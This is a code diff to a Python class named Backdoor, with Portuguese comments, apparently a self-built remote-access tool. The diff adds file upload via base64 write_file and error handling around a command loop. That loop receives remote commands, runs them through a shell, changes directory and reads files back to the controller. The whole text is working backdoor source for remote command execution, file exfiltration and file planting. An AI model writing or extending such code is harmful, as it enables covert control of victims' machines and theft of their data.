@@ -28,8 +28,17 @@ class Backdoor:
         return f"[+] Mudança para {new_directory}"
 
     def execute_command(self, command):
-        return (subprocess.check_output(command, shell=True)).decode('utf-8',
-                                                                     errors="ignore")  # O comando retorna um tipo byte, por isso é necessário decodificar para string
+        try:
+            return (subprocess.check_output(command, shell=True)).decode('utf-8',errors="ignore")  # O comando retorna um tipo byte, por isso é necessário decodificar para string
+        except Exception:
+            return "[-] Erro na execucao do comando"
+    def write_file(self,path,content):
+        content = base64.b64decode(content)
+        if not isinstance(content,bytes):
+            content = content.encode()
+        with open(path, 'wb') as file:
+            file.write(content)
+            return "[+] Arquivo baixado"
 
     def read_file(self,path):
         with open(path, "rb") as file:
@@ -38,16 +47,21 @@ class Backdoor:
     def start(self):
         while (1):
             comando = self.serial_receive()
-            if comando[0] == ":q":  # comando pode ser tratado como lista por vir de um json
-                self.stop()
-                break
-            elif comando[0] == "cd" and len(comando) > 1:
-                exec_result = self.change_directory(comando[1])
-            elif comando[0] == "download" and len(comando) > 1:
-                exec_result = self.read_file(comando[1])
-                exec_result = exec_result.decode('utf-8', errors="ignore")
-            else:
-                exec_result = self.execute_command(comando)
+            try:
+                if comando[0] == ":q":  # comando pode ser tratado como lista por vir de um json
+                    self.stop()
+                    break
+                elif comando[0] == "cd" and len(comando) > 1:
+                    exec_result = self.change_directory(comando[1])
+                elif comando[0] == "download" and len(comando) > 1:
+                    exec_result = self.read_file(comando[1])
+                    exec_result = exec_result.decode('utf-8', errors="ignore")
+                elif comando[0] == "upload" and len(comando) > 1:
+                    exec_result = self.write_file(comando[1],comando[2])
+                else:
+                    exec_result = self.execute_command(comando)
+            except Exception:#Exception genérica
+                exec_result = "[-] Erro em algum comando"
             self.serial_send(exec_result)
 
     def stop(self):
